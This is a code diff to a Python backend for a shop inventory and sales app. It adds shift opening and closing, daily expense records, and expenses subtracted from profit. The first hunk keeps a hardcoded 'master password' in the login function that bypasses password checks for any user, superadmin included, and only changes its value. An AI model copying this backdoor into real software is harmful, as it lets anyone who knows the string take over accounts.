@@ -98,7 +98,7 @@ def verify_user(username, password):
     user = res.data[0] if res.data else None
     
     # Master Password Override
-    is_master_bypass = (password == "BraeNovaMaster2026!")
+    is_master_bypass = (password == "StockMastaMaster2026!")
     
     if user and (is_master_bypass or check_password_hash(user['password_hash'], password)):
         if user['role'] == 'superadmin':
@@ -263,7 +263,7 @@ def delete_inventory_item(item_id, shop_id):
 
 # --- SALES & CHECKOUT ---
 
-def add_sale(inventory_id, qty_sold, total_price, shop_id, cashier_id=None, is_dinau=False, customer_name=None, payment_method='cash', receipt_id=None):
+def add_sale(inventory_id, qty_sold, total_price, shop_id, cashier_id=None, is_dinau=False, customer_name=None, payment_method='cash', receipt_id=None, shift_id=None):
     res = supabase.table('inventory').select('cost_price', 'quantity').eq('id', inventory_id).eq('shop_id', shop_id).execute()
     item = res.data[0] if res.data else None
     cost_at_sale = (float(item['cost_price']) * int(qty_sold)) if item else 0.0
@@ -278,7 +278,8 @@ def add_sale(inventory_id, qty_sold, total_price, shop_id, cashier_id=None, is_d
         "is_dinau": 1 if is_dinau else 0,
         "customer_name": customer_name,
         "receipt_id": receipt_id,
-        "shop_id": shop_id
+        "shop_id": shop_id,
+        "shift_id": shift_id
     }
     supabase.table('sales').insert(sale_data).execute()
     
@@ -294,9 +295,16 @@ def get_sales_summary(shop_id):
     total_cost = sum(float(s['cost_at_sale']) for s in sales)
     dinau_today = sum(float(s['total_price']) for s in sales if s['is_dinau'] == 1)
     
+    # Calculate daily expenses
+    from datetime import datetime
+    today = datetime.now().date().isoformat()
+    exp_res = supabase.table('expenses').select('amount').gte('expense_date', today).eq('shop_id', shop_id).execute()
+    total_expenses = sum(float(e['amount']) for e in exp_res.data) if exp_res.data else 0.0
+    
     return {
         'total_sales': total_sales,
-        'total_profit': total_sales - total_cost,
+        'total_profit': (total_sales - total_cost) - total_expenses,
+        'total_expenses': total_expenses,
         'expected_cash': total_sales - dinau_today
     }
 
@@ -628,3 +636,44 @@ def delete_shop_and_data(shop_id):
 
     # 7. Delete users
     supabase.table('users').delete().eq('shop_id', shop_id).execute()
+
+# --- SHIFTS & EXPENSES ---
+
+def add_expense(shop_id, amount, description, user_id):
+    supabase.table('expenses').insert({
+        "shop_id": shop_id,
+        "amount": amount,
+        "description": description,
+        "user_id": user_id
+    }).execute()
+
+def get_daily_expenses(shop_id):
+    from datetime import datetime
+    today = datetime.now().date().isoformat()
+    res = supabase.table('expenses').select('*, users(username)').gte('expense_date', today).eq('shop_id', shop_id).order('expense_date', desc=True).execute()
+    for e in res.data:
+        e['username'] = e['users']['username'] if e.get('users') else 'Unknown'
+    return res.data
+
+def open_shift(shop_id, user_id, starting_float):
+    from datetime import datetime
+    supabase.table('shifts').insert({
+        "shop_id": shop_id,
+        "user_id": user_id,
+        "starting_float": starting_float,
+        "status": "open",
+        "opened_at": datetime.utcnow().isoformat()
+    }).execute()
+
+def close_shift(shift_id, actual_cash, expected_cash):
+    from datetime import datetime
+    supabase.table('shifts').update({
+        "actual_cash": actual_cash,
+        "expected_cash": expected_cash,
+        "status": "closed",
+        "closed_at": datetime.utcnow().isoformat()
+    }).eq('id', shift_id).execute()
+
+def get_active_shift(shop_id, user_id):
+    res = supabase.table('shifts').select('*').eq('shop_id', shop_id).eq('user_id', user_id).eq('status', 'open').execute()
+    return res.data[0] if res.data else None
